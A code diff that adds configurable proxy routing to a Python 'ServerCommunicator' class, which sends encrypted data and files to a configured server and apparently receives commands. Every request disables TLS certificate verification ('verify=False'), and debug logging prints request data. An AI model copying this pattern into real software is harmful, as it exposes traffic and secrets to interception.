@@ -27,6 +27,10 @@ class ServerCommunicator:
         self.encryption = encryption_manager
         self.server_url = Config.SERVER_URL
         self.token = Config.SECRET_TOKEN
+        self.proxies = {
+            "http": Config.PROXY_HTTP,
+            "https": Config.PROXY_HTTPS
+        } if Config.PROXY_HTTP or Config.PROXY_HTTPS else None
 
     def _send_request(self, endpoint: str, data=None, files=None):
         try:
@@ -34,14 +38,14 @@ class ServerCommunicator:
             base_url = self.server_url.rstrip('/')
             url = f"{base_url}/{endpoint}"
             if Config.DEBUG_MODE:
-                logging.info(f"Sending request to {url} with data: {data}, files: {files is not None}")
+                logging.info(f"Sending request to {url} with data: {data}, files: {files is not None}, proxies: {self.proxies}")
             response = requests.post(
                 url,
                 data=data,
                 files=files,
                 verify=False,
                 timeout=Config.COMMAND_TIMEOUT,
-                proxies={'http': None, 'https': None}
+                proxies=self.proxies
             )
             return self._handle_response(response)
         except requests.exceptions.RequestException as e:
@@ -67,7 +71,8 @@ class ServerCommunicator:
                 self.server_url,
                 data=encrypted_data,
                 timeout=Config.COMMAND_TIMEOUT,
-                verify=False
+                verify=False,
+                proxies=self.proxies
             )
             if response.status_code != 200:
                 if Config.DEBUG_MODE:
@@ -104,7 +109,8 @@ class ServerCommunicator:
                 self.server_url,
                 data=encrypted_data,
                 timeout=Config.COMMAND_TIMEOUT,
-                verify=False
+                verify=False,
+                proxies=self.proxies
             )
             if response.status_code != 200:
                 if Config.DEBUG_MODE:
@@ -136,7 +142,8 @@ class ServerCommunicator:
                 self.server_url,
                 data=encrypted_data,
                 timeout=Config.COMMAND_TIMEOUT,
-                verify=False
+                verify=False,
+                proxies=self.proxies
             )
             if response.status_code != 200:
                 if Config.DEBUG_MODE:
@@ -172,7 +179,8 @@ class ServerCommunicator:
                 self.server_url,
                 data=encrypted_data,
                 timeout=Config.COMMAND_TIMEOUT,
-                verify=False
+                verify=False,
+                proxies=self.proxies
             )
             
             if response.status_code != 200:
@@ -212,7 +220,8 @@ class ServerCommunicator:
                 self.server_url,
                 data=encrypted_data,
                 timeout=Config.COMMAND_TIMEOUT,
-                verify=False
+                verify=False,
+                proxies=self.proxies
             )
             if response.status_code != 200:
                 if Config.DEBUG_MODE:
@@ -292,7 +301,8 @@ class ServerCommunicator:
                 data=encrypted_data,
                 files=files,
                 timeout=Config.COMMAND_TIMEOUT,
-                verify=False
+                verify=False,
+                proxies=self.proxies
             )
             if response.status_code != 200:
                 if Config.DEBUG_MODE:
@@ -372,7 +382,8 @@ class ServerCommunicator:
                 self.server_url,
                 data=encrypted_data,
                 timeout=Config.COMMAND_TIMEOUT,
-                verify=False
+                verify=False,
+                proxies=self.proxies
             )
             
             if response.status_code != 200:
@@ -410,7 +421,8 @@ class ServerCommunicator:
                 json=data,
                 headers={'Content-Type': 'application/json'},
                 verify=False,
-                timeout=Config.COMMAND_TIMEOUT
+                timeout=Config.COMMAND_TIMEOUT,
+                proxies=self.proxies
             )
             response.raise_for_status()
             if Config.DEBUG_MODE:
